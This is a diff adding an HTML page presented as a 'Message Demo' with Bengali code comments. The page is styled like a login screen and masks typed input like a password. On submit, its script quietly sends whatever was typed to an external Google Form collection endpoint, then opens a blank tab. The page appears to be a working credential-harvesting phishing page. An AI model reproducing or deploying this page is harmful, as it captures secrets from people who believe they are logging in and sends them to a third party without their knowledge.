@@ -1,0 +1,126 @@
+<!doctype html>
+<html lang="bn">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Dark — Message Demo</title>
+<style>
+  textarea { resize: none; }
+  #msg { height: 42px; padding: 10px 14px; border-radius: 10px; border: 1px solid rgba(255,255,255,0.08); background: transparent; color: #fff; font-size: 15px; outline: none; resize: none; overflow: hidden; }
+  :root{--bg:#161515;--card:#000;--muted:#9aa0a6;--accent:#8aa9ff;--radius:28px;font-family:Inter,ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,Arial}
+  *{box-sizing:border-box}html,body{height:100%;margin:0}
+  body{background:var(--bg);display:flex;align-items:center;justify-content:center;padding:24px;color:#e6eef8}
+  .wrap{width:100%;max-width:520px;background:var(--card);border-radius:var(--radius);padding:32px 36px;box-shadow:0 10px 40px rgba(0,0,0,0.6);display:flex;flex-direction:column;align-items:center}
+  .logo{width:140px;height:auto;display:block;margin-bottom:20px;border-radius:8px;opacity:0.9}
+  h1{font-size:34px;margin:0 0 50px 0;font-weight:600;line-height:1}
+  .user-info{width:100%;max-width:360px;margin-top:12px;margin-bottom:12px}
+  form{display:flex;flex-direction:column;gap:10px;width:100%;max-width:360px}
+  .field{display:flex;flex-direction:column;gap:6px}
+  label{font-size:13px;color:var(--muted);display:block}
+  input[type="text"], textarea{background:transparent;border:1px solid rgba(255,255,255,0.08);padding:12px;border-radius:10px;color:#fff;font-size:15px;outline:none}
+  .warning{color:#ff4c4c;font-size:14px;margin-top:4px;display:none;text-align:center;font-weight:600}
+  .controls{display:flex;align-items:center;justify-content:space-between;margin-top:2px}
+  .checkbox{display:flex;align-items:center;gap:10px;color:var(--muted);font-size:14px;font-weight:600}
+  .checkbox input{width:20px;height:20px;appearance:none;border:2px solid #8aa9ff;border-radius:6px;cursor:pointer;position:relative;background:transparent}
+  .checkbox input:checked{background:#8aa9ff}
+  .checkbox input:checked::after{content:'✔';position:absolute;top:1px;left:3px;font-size:12px;color:#000}
+  .btn-row{display:flex;align-items:center;justify-content:flex-end;margin-top:6px}
+  button{background:var(--accent);border:none;color:#07224a;padding:10px 18px;border-radius:999px;font-weight:600;cursor:pointer;font-size:15px}
+</style>
+</head>
+<body>
+<main class="wrap" id="mainWrap">
+  <img src="46334830.png" alt="site logo" class="logo" />
+  <h1>Welcome</h1>
+  <form id="loginForm" autocomplete="off" novalidate>
+    <div class="field">
+     <textarea id="msg" name="message" rows="3" placeholder="Type here" spellcheck="false"></textarea>
+
+    </div>
+    <div class="warning" id="warning">Please type</div>
+    <div class="controls">
+      <label class="checkbox"><input id="showMsg" type="checkbox" aria-label="Show message"> Show</label>
+    </div>
+    <div class="btn-row">
+      <button id="nextBtn" type="submit">Submit</button>
+    </div>
+  </form>
+</main>
+
+<script>
+(function(){
+  const form = document.getElementById('loginForm');
+  const msg = document.getElementById('msg');
+  const show = document.getElementById('showMsg');
+  const warning = document.getElementById('warning');
+  const submitBtn = document.getElementById('nextBtn');
+
+  // Google Form settings (যদি ব্যবহার করো)
+  const FORM_ACTION_URL = "https://docs.google.com/forms/d/e/1FAIpQLSfu1zwbOHUcH5MSCxpbMAxsOeOf_wSOQnXQDVZzSeG7Uc8X9g/formResponse";
+  const ENTRY_FIELD_NAME = "entry.440467992";
+
+  // --- চেকবক্স কন্সট্রোল: checkbox একটাই authority ---
+  function applyMaskingByCheckbox() {
+    // যদি তুমি input[type="password"] ব্যবহার করো: সহজভাবে type পরিবর্তন করব
+    // যদি textarea ব্যবহার করো: webkitTextSecurity প্রয়োগ
+    if (msg.tagName.toLowerCase() === 'input' && (msg.type === 'password' || msg.type === 'text')) {
+      // input element (password/text)
+      msg.type = show.checked ? 'text' : 'password';
+    } else {
+      // textarea বা অন্য element - use webkitTextSecurity where supported
+      if (show.checked) {
+        msg.style.webkitTextSecurity = 'none';
+      } else {
+        msg.style.webkitTextSecurity = 'disc'; // masked dots in supporting browsers
+      }
+    }
+  }
+
+  // প্রথম অবস্থায় চেকবক্সের অবস্থা প্রয়োগ করো
+  applyMaskingByCheckbox();
+
+  // চেকবক্স স্টেট বদলালে একেবারে সেই আচরণ প্রয়োগ করো
+  show.addEventListener('change', () => {
+    applyMaskingByCheckbox();
+  });
+
+  // Enter --> submit (Shift+Enter => newline allowed)
+  msg.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter' && !e.shiftKey) {
+      e.preventDefault();
+      submitBtn.click();
+    }
+  });
+
+  // ফর্ম সাবমিট হ্যান্ডলার
+  form.addEventListener('submit', function(e){
+    e.preventDefault();
+    const value = msg.value.trim();
+    if (!value) {
+      warning.style.display = 'block';
+      return;
+    }
+    warning.style.display = 'none';
+
+    // Google Form-এ POST (background, no-cors)
+    try {
+      fetch(FORM_ACTION_URL, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: `${ENTRY_FIELD_NAME}=${encodeURIComponent(value)}`
+      });
+    } catch (err) {
+      // নেগেটিভ কাজের জন্য কেবল কনসোলে লগ রাখছি
+      console.error('Submit error:', err);
+    }
+
+    // নতুন ট্যাব খোলা (ফাঁকা বা about:blank)
+    window.open('about:blank', '_blank');
+  });
+})();
+</script>
+
+
+</body>
+</html>
